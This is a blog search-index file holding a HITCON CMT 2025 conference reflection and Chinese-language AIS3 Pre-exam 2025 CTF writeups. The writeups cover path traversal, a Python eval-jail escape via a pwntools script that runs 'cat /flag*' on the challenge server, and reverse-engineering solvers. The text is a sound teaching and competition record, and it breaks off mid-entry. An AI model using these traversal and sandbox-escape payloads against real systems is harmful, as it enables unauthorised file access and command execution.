<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>HITCON CMT 2025 心得</title>
    <link href="/2025/08/29/HITCON-CMT-2025-%E5%BF%83%E5%BE%97/"/>
    <url>/2025/08/29/HITCON-CMT-2025-%E5%BF%83%E5%BE%97/</url>
    
    <content type="html"><![CDATA[<p>今年是我第一次去HITCON CMT，感謝HITCON的補助，如果沒有補助我大概沒錢參加。</p><p>第一天的議程，最有印象的是<a href="https://hitcon.org/2025/zh-TW/agenda/f7d2c779-86b1-45b7-b114-3a63dc067552/">只需一次 API 呼叫的致命一擊：從硬體逆向到突破保護機制的精準攻擊</a>，講者講述自己攻打IoT設備時碰到的各種防護，在硬體上碰到各種挑戰，還搞到把晶片解焊下來操作，或是用跳線的方式想去操縱硬體結果碰到阻抗匹配的問題，弄了很久才把韌體提取出來，在分析時又發現有些東西儲存在加密的磁區中，還得想辦法解密，一波三折的，搞到最後打出0day。我之後也想嘗試挖IoT設備的0day，這場議程也讓我看到了之後可能會搞到很燥的各種雷點，學到了很多東西，算是吸收他人經驗提前避雷了。</p><p>第二天議程去聽的是Orange的<a href="https://hitcon.org/2025/zh-TW/agenda/2bc7303a-f211-40f5-b8e6-64c4a8bb5dea/">The Art of PHP — My CTF Journey and Untold Stories!</a>，聽了大佬打各種CTF、比賽的故事，一路努力最後打到DEFCON前排，成為世界頂尖，希望以後我也可以跟ICEDTEA一起站上這個位置(我相信隊友會把我帶上去的)。</p><p>這次逛攤位逛的很少，有去B33F的攤位打他們的CTF，並且完成了賓果挑戰拿到獎品。<br><img src="/2025/08/29/HITCON-CMT-2025-%E5%BF%83%E5%BE%97/20250816_094045.jpg" alt="20250816_094045"></p><p>跟朋友一起去TWNIC的攤位，然後在那邊填了個問卷調查，最後領了個小獎品，是啥獎品我已經忘記了，不過我在那邊開玩笑，問人家答完問卷買domain有沒有優惠，挺搞笑的w</p><p>還有去Devcore的攤位旁邊看人家玩套圈圈，不過我自己沒下去玩。</p><p>最後想講，下午提供的小點心真的好多，多到吃一吃感覺要到半夜才會感覺到餓，一邊吃點心一邊逛攤位真的好爽w</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>AIS3 Pre-exam 2025 Writeups: 竹喵Maimai我來了</title>
    <link href="/2025/06/30/AIS3-Pre-exam-2025-Writeups/"/>
    <url>/2025/06/30/AIS3-Pre-exam-2025-Writeups/</url>
    
    <content type="html"><![CDATA[<h1 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h1><h2 id="名次"><a href="#名次" class="headerlink" title="名次"></a>名次</h2><p>AIS3 Pre-exam<br><img src="https://hackmd.io/_uploads/BJO6uWNMlx.png" alt="image"><br><img src="https://hackmd.io/_uploads/HkFJFWNzee.png" alt="image"></p><h2 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h2><p>我是垃圾，我把自己出賣給AI了<br>對不起，我沒去打<code>MyGO schedule manager β</code></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><p><img src="https://hackmd.io/_uploads/By8IYb4Mge.png" alt="image"></p><blockquote><p><code>AIS3&#123;Welcome_And_Enjoy_The_CTF_!&#125;</code></p></blockquote><h2 id="Ramen-CTF"><a href="#Ramen-CTF" class="headerlink" title="Ramen CTF"></a>Ramen CTF</h2><p><img src="https://hackmd.io/_uploads/ByN2YZNGee.png" alt="image"></p><p>題目<br><img src="https://hackmd.io/_uploads/B1nx9WEMlx.png" alt="image"></p><p>這題的關鍵是”發票”<br><img src="https://hackmd.io/_uploads/BytV5bEGxl.png" alt="image"></p><p>發票上有只缺了最後一個數字的賣家統編，通靈一下就可以得到是<code>34785923</code><br>用這個賣家統編去查就可以找到相關資訊<br><img src="https://hackmd.io/_uploads/BJxcc-Eflx.png" alt="image"></p><p>用營業（稅籍）登記地址在Google Maps找到的店家名稱是”樂山溫泉拉麵”<br><img src="https://hackmd.io/_uploads/ry13q-Nfgg.png" alt="image"></p><p>至於點的餐點是哪個，直接掃描發票上的QRCode，會掃描出一段文字，其中有”蝦拉”兩字<br><img src="https://hackmd.io/_uploads/BJeHhZVfex.png" alt="image"></p><p>對應到菜單上就是”蝦拉麵”(圖片右下角)<br><img src="https://hackmd.io/_uploads/HJ4Bn-4zgg.png" alt="image"></p><blockquote><p><code>AIS3&#123;樂山溫泉拉麵:蝦拉麵&#125;</code></p></blockquote><h2 id="AIS3-Tiny-Server-Web-Misc"><a href="#AIS3-Tiny-Server-Web-Misc" class="headerlink" title="AIS3 Tiny Server - Web &#x2F; Misc"></a>AIS3 Tiny Server - Web &#x2F; Misc</h2><p><img src="https://hackmd.io/_uploads/ryi2n-Efle.png" alt="image"></p><p>網站開起來是這樣<br><img src="https://hackmd.io/_uploads/Byq7TbNMxg.png" alt="image"></p><p>看來是直接Serve static file的網站<br><img src="https://hackmd.io/_uploads/Hyot6bEMel.png" alt="image"></p><p>而且可以在Path用<code>../</code>達到Path Traversal(<code>/</code>用<code>%2f</code>代替)<br><img src="https://hackmd.io/_uploads/S1YJA-4Mlx.png" alt="image"></p><p>讀取Flag<br><img src="https://hackmd.io/_uploads/S1Sb0-NGxg.png" alt="image"></p><blockquote><p><code>AIS3&#123;tInY_WeB_s3RVER_Wi7H_FIl3_8ROWs1n9_@5_@_feaTUr3&#125;</code></p></blockquote><h2 id="nocall-🈲📞"><a href="#nocall-🈲📞" class="headerlink" title="nocall 🈲📞"></a>nocall 🈲📞</h2><p><img src="https://hackmd.io/_uploads/By8tC-VMlx.png" alt="image"></p><p>server.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/local/bin/python3</span><br><span class="hljs-keyword">import</span> unicodedata<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">open</span>(__file__).read())<br><br>expr = unicodedata.normalize(<span class="hljs-string">&quot;NFKC&quot;</span>, <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt; &quot;</span>))<br><br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;._&quot;</span> <span class="hljs-keyword">in</span> expr:<br>    <span class="hljs-keyword">raise</span> NameError(<span class="hljs-string">&quot;no __ %r&quot;</span> % expr)<br><br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;breakpoint&quot;</span> <span class="hljs-keyword">in</span> expr:<br>    <span class="hljs-keyword">raise</span> NameError(<span class="hljs-string">&quot;no breakpoint %r&quot;</span> % expr)<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>([x <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;([ ])&quot;</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> expr]):<br>    <span class="hljs-keyword">raise</span> NameError(<span class="hljs-string">&quot;no ([ ]) %r&quot;</span> % expr)<br><br><span class="hljs-comment"># baby version: response for free OUO</span><br>result = <span class="hljs-built_in">eval</span>(expr)<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p>Blacklists:</p><ul><li><code>breakpoint</code></li><li><code>._</code></li><li><code>(</code></li><li><code>)</code></li><li><code> </code></li><li><code>[</code></li><li><code>]</code></li></ul><p>禁用了小括號，沒辦法直接call function，但是Ln18會把<code>eval</code>跑之後的結果存入<code>result</code>，在Ln19<code>print(result)</code><br>如果能把<code>print</code>變成<code>eval</code>，同時<code>eval</code>回傳、存入<code>result</code>的是<code>__import__(&#39;os&#39;).system(&#39;cat /flag*&#39;)</code>，就可以打掉這題</p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">conv</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">&quot;\\x%2x&quot;</span>%<span class="hljs-built_in">ord</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s)<br><br>r = remote(<span class="hljs-string">&quot;chals1.ais3.org&quot;</span>, <span class="hljs-number">15451</span>)<br><br>payload = conv(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /flag*&#x27;)&quot;</span>)<br>payload = <span class="hljs-string">&quot;&#123;print:=eval&#125;and\&quot;%s\&quot;&quot;</span>%payload<br><span class="hljs-built_in">print</span>(payload)<br><span class="hljs-comment">#exit()</span><br>r.sendlineafter(<span class="hljs-string">b&quot;&gt; &quot;</span>, payload.encode())<br><br>r.interactive()<br></code></pre></td></tr></table></figure><p>Payload攤開是長這樣</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<span class="hljs-built_in">print</span>:=<span class="hljs-built_in">eval</span>&#125;<span class="hljs-keyword">and</span><span class="hljs-string">&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x63\x61\x74\x20\x2f\x66\x6c\x61\x67\x2a\x27\x29&quot;</span><br></code></pre></td></tr></table></figure><p><code>and</code>的左邊是一個<code>set</code>(<code>&#123;1, 2, 3&#125;</code>這樣是個<code>set</code>)，在這個<code>set</code>中使用海象運算符<code>:=</code>，把<code>print</code>賦值<code>eval</code>，這樣 server.py Ln19表面上是執行<code>print(result)</code>，其實是變成<code>eval(result)</code><br><code>and</code>的右邊就是要執行的命令，以<code>\x??</code>的形式輸入，這樣才不會被Ban<br>而中間用<code>and</code>，可以確保兩邊都被執行到(兩邊都需要執行過，知道值，才能把兩邊的值拿來<code>and</code>，而<code>or</code>不一樣，如果一邊對<code>or</code>已經是真，另一邊就不會執行)，且最後回傳我的command</p><p>ㄟ幹但我不會Revenge</p><blockquote><p><code>AIS3&#123;you_can_overwrite_builtins_to_call_without_()&#125;</code></p></blockquote><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>我大退步</p><h2 id="Tomorin-db-🐧"><a href="#Tomorin-db-🐧" class="headerlink" title="Tomorin db 🐧"></a>Tomorin db 🐧</h2><p><img src="https://hackmd.io/_uploads/Hka8MMNMgl.png" alt="image"></p><p>網站後端會serve<code>/app/Tomorin</code>底下的檔案，目標是<code>/app/Tomorin/flag</code><br>但是後端有一個route<code>/flag</code>，如果直接打<code>http://chals1.ais3.org:30000/flag</code>會匹配到這個route，堇姬會讓Redirect你去看Ave Mujica<br><img src="https://hackmd.io/_uploads/r1YYGfVMlx.png" alt="image"></p><p>可以用<code>http://chals1.ais3.org:30000/%2fflag</code><br>到後端的時候，這個Path會匹配不到route<code>/flag</code>，然後匹配<code>/</code>，serve static file，就可以拿到Flag了<br><img src="https://hackmd.io/_uploads/SkrbXG4fxe.png" alt="image"></p><p>ChatGPT拿了MVP<br><img src="https://hackmd.io/_uploads/ryN_XzEzxl.png" alt="image"></p><blockquote><p><code>AIS3&#123;G01ang_H2v3_a_c0O1_way!!!_Us3ing_C0NN3ct_M3Th07_L0l@T0m0r1n_1s_cute_D0_yo7_L0ve_t0MoRIN?&#125;</code></p></blockquote><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="AIS3-Tiny-Server-Reverse"><a href="#AIS3-Tiny-Server-Reverse" class="headerlink" title="AIS3 Tiny Server - Reverse"></a>AIS3 Tiny Server - Reverse</h2><p><img src="https://hackmd.io/_uploads/SJu6Qf4Mgl.png" alt="image"></p><p>decompile之後一個一個函式點開(對，真的)，在<code>0x11e20</code>摸到了一個長比較奇怪的，一臉Flag Checker樣(真的，別不信，我直覺這就是Flag Checker)<br><img src="https://hackmd.io/_uploads/HyZOIMVMxg.png" alt="image"></p><p>就是有兩個陣列<code>_flag</code>跟<code>local_49</code>，兩個迴圈都有各自的初始值，產生flag的過程簡化來說就是這樣，最後flag會被存在<code>_flag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">1</span>):<br>    _flag = _flag[i] ^ local_49[i % <span class="hljs-number">10</span>]<br></code></pre></td></tr></table></figure><p>下面這邊就是把輸入的flag跟上面產生的<code>_flag</code>比對，反正不重要<br><img src="https://hackmd.io/_uploads/HkEavzEzgl.png" alt="image"></p><p>工人智慧之後寫出解題腳本<br>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag_checker</span>(<span class="hljs-params">flag:<span class="hljs-built_in">str</span></span>):<br>  local_49 = [<span class="hljs-number">0</span>] * <span class="hljs-number">11</span><br>  _flag = [<span class="hljs-number">0</span>]*<span class="hljs-number">46</span><br>  <br>  bVar5 = <span class="hljs-number">0x33</span><br>  _flag[<span class="hljs-number">0x2c</span>] = <span class="hljs-number">0x14</span><br>  _flag[<span class="hljs-number">0x2d</span>] = <span class="hljs-number">0</span><br>  bVar1 = <span class="hljs-number">0x72</span><br>  _flag[<span class="hljs-number">0</span>] = <span class="hljs-number">0x33</span><br>  _flag[<span class="hljs-number">1</span>] = <span class="hljs-number">0x20</span><br>  _flag[<span class="hljs-number">2</span>] = <span class="hljs-number">0x38</span><br>  _flag[<span class="hljs-number">3</span>] = <span class="hljs-number">0x58</span><br>  _flag[<span class="hljs-number">4</span>] = <span class="hljs-number">0x12</span><br>  _flag[<span class="hljs-number">5</span>] = <span class="hljs-number">0x28</span><br>  _flag[<span class="hljs-number">6</span>] = <span class="hljs-number">0x5c</span><br>  _flag[<span class="hljs-number">7</span>] = <span class="hljs-number">0x47</span><br>  _flag[<span class="hljs-number">8</span>] = <span class="hljs-number">0x29</span><br>  _flag[<span class="hljs-number">9</span>] = <span class="hljs-number">0x52</span><br>  _flag[<span class="hljs-number">10</span>] = <span class="hljs-number">0x2d</span><br>  _flag[<span class="hljs-number">0xb</span>] = <span class="hljs-number">0xf</span><br>  _flag[<span class="hljs-number">0xc</span>] = <span class="hljs-number">0x5a</span><br>  _flag[<span class="hljs-number">0xd</span>] = <span class="hljs-number">10</span><br>  _flag[<span class="hljs-number">0xe</span>] = <span class="hljs-number">0xe</span><br>  _flag[<span class="hljs-number">0xf</span>] = <span class="hljs-number">0</span><br>  _flag[<span class="hljs-number">0x10</span>] = <span class="hljs-number">0xf</span><br>  _flag[<span class="hljs-number">0x11</span>] = <span class="hljs-number">0x58</span><br>  _flag[<span class="hljs-number">0x12</span>] = <span class="hljs-number">0x13</span><br>  _flag[<span class="hljs-number">0x13</span>] = <span class="hljs-number">0x50</span><br>  _flag[<span class="hljs-number">0x14</span>] = <span class="hljs-number">0x19</span><br>  _flag[<span class="hljs-number">0x15</span>] = <span class="hljs-number">0x5a</span><br>  _flag[<span class="hljs-number">0x16</span>] = <span class="hljs-number">0x19</span><br>  _flag[<span class="hljs-number">0x17</span>] = <span class="hljs-number">0x34</span><br>  _flag[<span class="hljs-number">0x18</span>] = <span class="hljs-number">0x58</span><br>  _flag[<span class="hljs-number">0x19</span>] = <span class="hljs-number">0x31</span><br>  _flag[<span class="hljs-number">0x1a</span>] = <span class="hljs-number">0x33</span><br>  _flag[<span class="hljs-number">0x1b</span>] = <span class="hljs-number">0x43</span><br>  _flag[<span class="hljs-number">0x1c</span>] = <span class="hljs-number">0x13</span><br>  _flag[<span class="hljs-number">0x1d</span>] = <span class="hljs-number">0x41</span><br>  _flag[<span class="hljs-number">0x1e</span>] = <span class="hljs-number">4</span><br>  _flag[<span class="hljs-number">0x1f</span>] = <span class="hljs-number">0x5a</span><br>  _flag[<span class="hljs-number">0x20</span>] = <span class="hljs-number">0x19</span><br>  _flag[<span class="hljs-number">0x21</span>] = <span class="hljs-number">0x34</span><br>  _flag[<span class="hljs-number">0x22</span>] = <span class="hljs-number">0x58</span><br>  _flag[<span class="hljs-number">0x23</span>] = <span class="hljs-number">0x2c</span><br>  _flag[<span class="hljs-number">0x24</span>] = <span class="hljs-number">0x33</span><br>  _flag[<span class="hljs-number">0x25</span>] = <span class="hljs-number">0x53</span><br>  _flag[<span class="hljs-number">0x26</span>] = <span class="hljs-number">0x46</span><br>  _flag[<span class="hljs-number">0x27</span>] = <span class="hljs-number">3</span><br>  _flag[<span class="hljs-number">0x28</span>] = <span class="hljs-number">0x1e</span><br>  _flag[<span class="hljs-number">0x29</span>] = <span class="hljs-number">0x48</span><br>  _flag[<span class="hljs-number">0x2a</span>] = <span class="hljs-number">0x4a</span><br>  _flag[<span class="hljs-number">0x2b</span>] = <span class="hljs-number">0x4a</span><br>  local_49[<span class="hljs-number">0</span>] = <span class="hljs-number">0x72</span><br>  local_49[<span class="hljs-number">1</span>] = <span class="hljs-number">0x69</span><br>  local_49[<span class="hljs-number">2</span>] = <span class="hljs-number">0x6b</span><br>  local_49[<span class="hljs-number">3</span>] = <span class="hljs-number">0x6b</span><br>  local_49[<span class="hljs-number">4</span>] = <span class="hljs-number">0x69</span><br>  local_49[<span class="hljs-number">5</span>] = <span class="hljs-number">0x5f</span><br>  local_49[<span class="hljs-number">6</span>] = <span class="hljs-number">0x6c</span><br>  local_49[<span class="hljs-number">7</span>] = <span class="hljs-number">0x30</span><br>  local_49[<span class="hljs-number">8</span>] = <span class="hljs-number">0x76</span><br>  local_49[<span class="hljs-number">9</span>] = <span class="hljs-number">0x33</span><br>  uVar3 = <span class="hljs-number">0</span><br>  <br>  <span class="hljs-keyword">while</span> (<span class="hljs-literal">True</span>):<br>    _flag[uVar3] = bVar1 ^ bVar5<br>    uVar4 = uVar3 + <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> (uVar4 == <span class="hljs-number">0x2d</span>): <span class="hljs-keyword">break</span><br>    bVar5 = _flag[uVar3 + <span class="hljs-number">1</span>]<br>    bVar1 = local_49[uVar4 % <span class="hljs-number">10</span>]<br>    uVar3 = uVar4<br>  <br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">chr</span>, _flag))))<br><br>flag_checker(<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>不過解題腳本就是我直接把Ghidra decompile的東西貼到Python裡改一改</p><blockquote><p><code>AIS3&#123;w0w_a_f1ag_check3r_1n_serv3r_1s_c00l!!!&#125;</code></p></blockquote><h2 id="web-flag-checker"><a href="#web-flag-checker" class="headerlink" title="web flag checker"></a>web flag checker</h2><p><img src="https://hackmd.io/_uploads/SkW8KM4fle.png" alt="image"></p><p>一個Flag Checker，最主要目標是<code>index.wasm</code><br><img src="https://hackmd.io/_uploads/H1r5KfEGxl.png" alt="image"></p><p>把這個<code>index.wasm</code>丟到(有裝wasm plugin的)Ghidra，可以看到export中有一個<code>flagchecker</code><br><img src="https://hackmd.io/_uploads/SyBkoz4fxe.png" alt="image"></p><p>decompile<br><img src="https://hackmd.io/_uploads/rkaxsfNGxe.png" alt="image"><br>可以看到有個迴圈，把flag被以每8bytes一組，當做第一個參數丟進去<code>unnamed_function_8</code>，第二個參數是<code>0xfd9ea72d &gt;&gt; (i * 6 &amp; 0x1f) &amp; 0x3f</code>，而函式的回傳值跟<code>local_40[i]</code>比對</p><p><code>unnamed_function_8</code>內其實就是做循環左移，然後回傳<br><img src="https://hackmd.io/_uploads/Sk9cizNzll.png" alt="image"></p><p>所以只要把flag 8bytes一組循環右移回去就可以解題了</p><p>工人智慧腳本 exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">function8</span>(<span class="hljs-params">payload, a2</span>):<br>    res = payload &lt;&lt; (a2 &amp; <span class="hljs-number">0x3f</span>) | payload &gt;&gt; ((<span class="hljs-number">0x40</span> - a2) ^ <span class="hljs-number">0x3f</span>)<br>    <span class="hljs-keyword">return</span> res &amp; <span class="hljs-number">0xffffffffffffffff</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ror</span>(<span class="hljs-params">x, n</span>):<br>    <span class="hljs-keyword">return</span> ((x &gt;&gt; n) | (x &lt;&lt; (<span class="hljs-number">64</span> - n))) &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFFF</span><br><br>local_40 = [<span class="hljs-number">0</span>] * <span class="hljs-number">5</span><br>local_40[<span class="hljs-number">0</span>] = <span class="hljs-number">0x69282a668aef666a</span><br>local_40[<span class="hljs-number">1</span>] = <span class="hljs-number">0x633525f4d7372337</span><br>local_40[<span class="hljs-number">2</span>] = <span class="hljs-number">0x9db9a5a0dcc5dd7d</span><br>local_40[<span class="hljs-number">3</span>] = <span class="hljs-number">0x9833afafb8381a2f</span><br>local_40[<span class="hljs-number">4</span>] = <span class="hljs-number">0x6fac8c8726464726</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    res = ror(local_40[i], <span class="hljs-number">0xfd9ea72d</span> &gt;&gt; (i * <span class="hljs-number">6</span> &amp; <span class="hljs-number">0x1f</span>) &amp; <span class="hljs-number">0x3f</span>)<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>((res&gt;&gt;_*<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0xff</span>), end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span>()<br></code></pre></td></tr></table></figure><blockquote><p><code>AIS3&#123;W4SM_R3v3rsing_w17h_g0_4pp_39229dd&#125;</code></p></blockquote><h2 id="verysafe-image-encrypter"><a href="#verysafe-image-encrypter" class="headerlink" title="verysafe_image_encrypter"></a>verysafe_image_encrypter</h2><p><img src="https://hackmd.io/_uploads/SymYrLNflx.png" alt="image"></p><p>程式會把目錄下的<code>input_image.png</code>加密，輸出到<code>encrypted_image.png</code><br>分析過程先用網路上隨便找的png圖片來用，最後解題再解密題目附的<code>encrypted_image.png</code><br><img src="https://hackmd.io/_uploads/H1r_8LNfgl.png" alt="image"></p><p>有加殼，用的還是自製殼<br><img src="https://hackmd.io/_uploads/Bk2iB8Vzge.png" alt="image"></p><p>在<code>_start()</code>中可以看到，程式跑過幾個function之後直接一個跳轉<br><img src="https://hackmd.io/_uploads/SyX8FLNzgg.png" alt="image"></p><p>在x64dbg中看這個跳轉跳去哪裡，跳到了<code>0x4014c0</code><br><img src="https://hackmd.io/_uploads/rkxGgD4Meg.png" alt="image"></p><p>但這一大塊在原本的程式裡面都是空的，推測到這個跳轉的時候是已經解殼完成，跳轉到的是OEP<br><img src="https://hackmd.io/_uploads/ryxVev4Glg.png" alt="image"></p><p>接著就是在x64dbg中把這個程式dump下來分析<br>可以找到程式本體的<code>main</code>在<code>0x4018ea</code><br><img src="https://hackmd.io/_uploads/Bk20FP4Mel.png" alt="image"></p><p>原本的程式是沒有symbol的(圖片裡看到函式有名稱都是分析時命名的)，而且還c++寫的，逆向起來很耗人<br>中間試了一堆機掰路，wp裡就直接講我最後的解法</p><p>用API Monitor看程式調用了哪些API，可以看到程式在解殼之後打開<code>input_image.png</code>並進行了多次的讀取，後面是把加密結果一次寫入<code>encrypted_image.png</code><br><img src="https://hackmd.io/_uploads/HyNgzwVMlx.png" alt="image"></p><p>根據Call Stack，可以找到調用write的點是在<code>0x485cce</code><br><img src="https://hackmd.io/_uploads/S1vLGwNMex.png" alt="image"></p><p>追這個buffer是從哪裡來的，最後可以得到這樣一條路徑</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-number">0x40187f</span> sub_40177d<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> buffer作為第二個參數，傳入<span class="hljs-number">0x47c0d0</span><br><span class="hljs-number">0x47c145</span> sub_47c0d0<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> buffer作為第二個參數，傳入<span class="hljs-number">0x48e290</span>(這邊用的indirect call)<br><span class="hljs-number">0x48e319</span> sub_48e290<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> buffer作為第五個參數，傳入<span class="hljs-number">0x485c80</span><br><span class="hljs-number">0x485cc9</span> sub_485c80<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> buffer作為第二個參數，傳入write<br></code></pre></td></tr></table></figure><p>看到<code>0x40187f sub_40177d()</code>，<code>buffer</code>來自”傳入<code>bufabout</code>(這是我自己打的名字)作為第一個參數，呼叫<code>sub_4315a4()</code>“的回傳值<br><img src="https://hackmd.io/_uploads/ryOlX_EMxe.png" alt="image"></p><p><code>sub_4315a4()</code>的作用基本上就是回傳<code>dword bufabout+0x0</code><br>也就是說，<code>buffer</code>的指針就放在<code>dword bufabout+0x0</code></p><p><code>bufabout</code>是<code>sub_40177d()</code>的第二個參數<br>再往上追<code>bufabout</code>從哪來，可以看到是在<code>0x40197e main()</code>中，呼叫<code>sub_40177d()</code>把<code>bufabout</code>作為第二個參數傳入<br><img src="https://hackmd.io/_uploads/r1HbkuEMxe.png" alt="image"></p><p>而我們看到<code>0x40197e main()</code>，可以看到<code>bufabout</code>，第一次出現是在上面呼叫<code>sub_401580</code>作為第一個參數傳入，第二次出現是在上面呼叫<code>sub_401520</code>作為第一個參數傳入，最後呼叫<code>sub_40177d</code>就是寫入了<br><img src="https://hackmd.io/_uploads/B1kM5DNMxe.png" alt="image"></p><p>下兩個斷點，分別在呼叫<code>sub_40177d()</code>處(<code>0x40197e</code>)，跟<code>sub_485c80</code>中呼叫<code>write</code>處(<code>0x485cc9</code>)<br>可以看到在呼叫<code>sub_40177d()</code>時，<code>buffer</code>中就已經是加密過的圖片資料<br><img src="https://hackmd.io/_uploads/rkhsr_NGgx.png" alt="image"><br>在呼叫<code>write</code>處資料也沒有改變，所以加密沒有發生在<code>sub_40177d()</code>中<br><img src="https://hackmd.io/_uploads/BkYAHuNMxe.png" alt="image"></p><p>後面就下斷點在<code>main()</code>中呼叫<code>sub_401580()</code>處，往後查發現在<code>0x401965</code>，傳入<code>bufabout</code>呼叫<code>sub_401520()</code>之前，<code>bufabout</code>中有<code>buffer</code>的指針，<code>buffer</code>裡面有<code>input_image.png</code>的資料<br><img src="https://hackmd.io/_uploads/rJfnOu4fxe.png" 